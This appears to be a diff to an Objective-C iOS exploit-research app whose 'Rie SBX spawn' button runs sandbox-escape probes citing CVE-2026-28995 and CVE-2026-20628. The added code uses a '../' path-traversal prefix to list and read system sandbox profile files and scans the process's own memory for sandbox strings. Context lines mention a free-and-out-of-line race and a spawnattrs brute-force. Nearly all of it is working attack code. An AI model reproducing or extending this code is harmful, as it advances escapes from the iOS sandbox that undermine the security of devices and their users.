@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v227)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v228)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v227: fix stack overflow, iOS profiles + 7 fmts ===\n"];
+        [self appendLog:@"\n=== Rie v228: sandbox profile discovery + dyld string search ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9750,6 +9750,110 @@ static uint64_t rie_find_exec_base(task_t task,
         else { [rpt appendString:@"[miss:TSS] "]; missing++; }
         [self appendLog:rpt];
         [self appendLog:[NSString stringWithFormat:@"Total: %d available, %d missing", avail, missing]];
+
+        // ── Phase F: discover iOS sandbox profile names & formats ──
+        [self appendLog:@"\n── Phase F: sandbox profile discovery ──"];
+
+        // Strategy 1: list sandbox profile directories via path traversal
+        NSArray *sbDirs = @[
+            @"/System/Library/Sandbox/Profiles/",
+            @"/System/Library/Sandbox/",
+            @"/usr/share/sandbox/",
+            @"/usr/local/share/sandbox/",
+            @"/Library/Sandbox/",
+        ];
+        NSMutableSet *foundProfiles = [NSMutableSet set];
+        NSMutableSet *foundSBFileNames = [NSMutableSet set];
+        for (NSString *dir in sbDirs) {
+            NSString *raw = [traversalPrefix stringByAppendingString:dir];
+            NSString *resolved = [raw stringByExpandingTildeInPath];
+            NSError *lsErr = nil;
+            NSArray *contents = [[NSFileManager defaultManager]
+                contentsOfDirectoryAtPath:resolved error:&lsErr];
+            if (contents) {
+                [self appendLog:[NSString stringWithFormat:@"  %@ -> %lu entries", dir,
+                    (unsigned long)contents.count]];
+                for (NSString *f in contents) {
+                    [foundSBFileNames addObject:f];
+                    // Strip extension to get profile name
+                    NSString *base = [f stringByDeletingPathExtension];
+                    if (![base isEqualToString:f]) [foundProfiles addObject:base];
+                    if ([f hasSuffix:@".sb"] || [f hasSuffix:@".sbpl"] || [f hasSuffix:@".xml"]) {
+                        // Try to read first 256 bytes
+                        NSString *fp = [resolved stringByAppendingPathComponent:f];
+                        NSData *d = [NSData dataWithContentsOfFile:fp];
+                        if (d) {
+                            NSString *preview = [[NSString alloc]
+                                initWithData:[d subdataWithRange:NSMakeRange(0, MIN(256, d.length))]
+                                encoding:NSUTF8StringEncoding];
+                            if (!preview) preview = [[NSString alloc]
+                                initWithData:[d subdataWithRange:NSMakeRange(0, MIN(256, d.length))]
+                                encoding:NSASCIIStringEncoding];
+                            if (preview) {
+                                // Show first 120 chars
+                                NSString *p = [preview stringByReplacingOccurrencesOfString:@"\n" withString:@"\\n"];
+                                [self appendLog:[NSString stringWithFormat:@"    %@ (%luB): %@...",
+                                    f, (unsigned long)d.length,
+                                    [p substringToIndex:MIN(120, p.length)]]];
+                            }
+                        }
+                    }
+                }
+            } else if (lsErr.code != 257 && lsErr.code != 260 && lsErr.code != 2) {
+                [self appendLog:[NSString stringWithFormat:@"  %@ -> %@ (code=%ld)",
+                    dir, lsErr.localizedDescription, (long)lsErr.code]];
+            }
+        }
+        [self appendLog:[NSString stringWithFormat:@"Discovered %lu profile filenames: %@",
+            (unsigned long)foundSBFileNames.count,
+            [[foundSBFileNames allObjects] componentsJoinedByString:@", "]]];
+
+        // Strategy 2: grep dyld cache for "Sandbox" and "profile" strings
+        [self appendLog:@"\n-- dyld cache string search --"];
+        if (vm_read_over && vm_region_rec) {
+            rie_mach_vm_address_t sWalk = 0x180000000ULL;
+            rie_mach_vm_size_t sSize = 0;
+            natural_t sDepth = 1;
+            int sbHits = 0;
+            for (int si = 0; si < 80 && sbHits < 20; si++) {
+                rie_vm_region_info_t info;
+                memset(info, 0, sizeof(info));
+                mach_msg_type_number_t cnt = sizeof(info) / sizeof(natural_t);
+                if (vm_region_rec(mach_task_self(), &sWalk, &sSize, &sDepth,
+                    (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
+                if (sWalk >= 0x200000000ULL) break;
+                if (sSize < 0x10000) { sWalk += sSize; continue; }
+                // Read up to 1MB per region looking for sandbox strings
+                size_t readSz = (size_t)(sSize < 0x100000 ? sSize : 0x100000);
+                uint8_t *sbuf = (uint8_t *)malloc(readSz);
+                if (sbuf) {
+                    memset(sbuf, 0, readSz);
+                    rie_mach_vm_size_t got = 0;
+                    if (vm_read_over(mach_task_self(), sWalk, readSz,
+                        (rie_mach_vm_address_t)(uintptr_t)sbuf, &got) == KERN_SUCCESS) {
+                        // Search for sandbox-related ASCII strings
+                        for (size_t pos = 0; pos + 4 < got; pos++) {
+                            if (memcmp(sbuf + pos, "sandbox", 7) == 0 ||
+                                memcmp(sbuf + pos, "Sandbox", 7) == 0 ||
+                                memcmp(sbuf + pos, "container", 9) == 0) {
+                                // Extract null-terminated string
+                                size_t end = pos; while (end < got && sbuf[end] >= 32 && sbuf[end] < 127) end++;
+                                if (end - pos > 3 && end - pos < 256) {
+                                    char tmp[257]; size_t l = end-pos < 256 ? end-pos : 256;
+                                    memcpy(tmp, sbuf+pos, l); tmp[l]=0;
+                                    [self appendLog:[NSString stringWithFormat:@"  @0x%llx: '%s'",
+                                        (unsigned long long)(sWalk + pos), tmp]];
+                                    sbHits++;
+                                    pos = end;
+                                }
+                            }
+                        }
+                    }
+                    free(sbuf);
+                }
+                sWalk += sSize;
+            }
+        }
 
         // ── Phase B-2: CVE-2026-20628 sandbox-spawnattrs brute-force ──
         [self appendLog:@"\n── Phase B-2: sandbox-spawnattrs (CVE-2026-20628) probe ──"];
